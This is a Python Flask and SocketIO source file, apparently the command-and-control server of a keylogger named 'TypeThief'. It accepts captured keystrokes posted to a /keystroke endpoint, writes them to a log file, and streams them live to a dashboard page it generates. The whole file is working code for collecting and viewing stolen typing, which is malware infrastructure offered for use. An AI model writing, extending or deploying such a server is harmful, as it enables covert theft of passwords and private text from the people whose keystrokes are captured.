# realtime_server.py
import os
import secrets
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
import logging
import sys

# Configure logging
logging.basicConfig(
    filename="realtime_server.log",
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("FLASK_SECRET_KEY") or secrets.token_urlsafe(32)
socketio = SocketIO(app)

keystrokes = []

@app.route('/')
def index():
    try:
        logger.info("Attempting to render index.html")
        return render_template('index.html', keystrokes=keystrokes)
    except Exception as e:
        logger.error(f"Error rendering index.html: {e}")
        return f"Error loading page: {str(e)}", 500

@app.route('/keystroke', methods=['POST'])
def receive_keystroke():
    try:
        data = request.get_json()
        if data and "keystroke" in data:
            keystroke = data["keystroke"]
            timestamp = data.get("timestamp", "N/A")
            entry = f"[{timestamp}] {keystroke}"
            keystrokes.append(entry)
            logger.info(f"Received keystroke: {entry}")
            socketio.emit('new_keystroke', {'keystroke': entry})
            return {"status": "success"}, 200
        logger.warning("Invalid POST data received")
        return {"status": "error", "message": "Invalid data"}, 400
    except Exception as e:
        logger.error(f"Error in receive_keystroke: {e}")
        return {"status": "error", "message": str(e)}, 500

@socketio.on('connect')
def handle_connect():
    logger.info("Client connected via WebSocket")
    emit('initial_keystrokes', {'keystrokes': keystrokes})

@socketio.on('error')
def handle_error(e):
    logger.error(f"WebSocket error: {e}")

def create_template():
    template_dir = os.path.join(os.path.dirname(__file__), "templates")
    template_path = os.path.join(template_dir, "index.html")
    if not os.path.exists(template_path):
        os.makedirs(template_dir, exist_ok=True)
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>TypeThief Real-Time Keystrokes</title>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
                h1 { color: #333; }
                #keystrokes { background: white; padding: 10px; border: 1px solid #ccc; height: 400px; overflow-y: scroll; }
            </style>
        </head>
        <body>
            <h1>Real-Time Keystrokes</h1>
            <div id="keystrokes">
                {% for keystroke in keystrokes %}
                    <p>{{ keystroke }}</p>
                {% endfor %}
            </div>
            <script>
                var socket = io.connect('http://' + document.domain + ':' + location.port);
                socket.on('connect', function() {
                    console.log('Connected to server');
                });
                socket.on('initial_keystrokes', function(data) {
                    var div = document.getElementById('keystrokes');
                    div.innerHTML = '';
                    data.keystrokes.forEach(function(keystroke) {
                        var p = document.createElement('p');
                        p.textContent = keystroke;
                        div.appendChild(p);
                    });
                });
                socket.on('new_keystroke', function(data) {
                    var div = document.getElementById('keystrokes');
                    var p = document.createElement('p');
                    p.textContent = data.keystroke;
                    div.appendChild(p);
                    div.scrollTop = div.scrollHeight;
                });
            </script>
        </body>
        </html>
        """
        with open(template_path, "w") as f:
            f.write(html_content)
        logger.info(f"Created template at {template_path}")
    else:
        logger.info(f"Template already exists at {template_path}")

if __name__ == "__main__":
    try:
        port = int(os.environ.get("PORT", 5000))
        host = "0.0.0.0"
        create_template()
        logger.info(f"Starting server on {host}:{port}")
        print(f"Starting real-time keystroke server on http://{host}:{port}")
        socketio.run(app, host=host, port=port, debug=True, use_reloader=False)
    except Exception as e:
        logger.error(f"Server startup failed: {e}")
        print(f"Error starting server: {e}")
        sys.exit(1)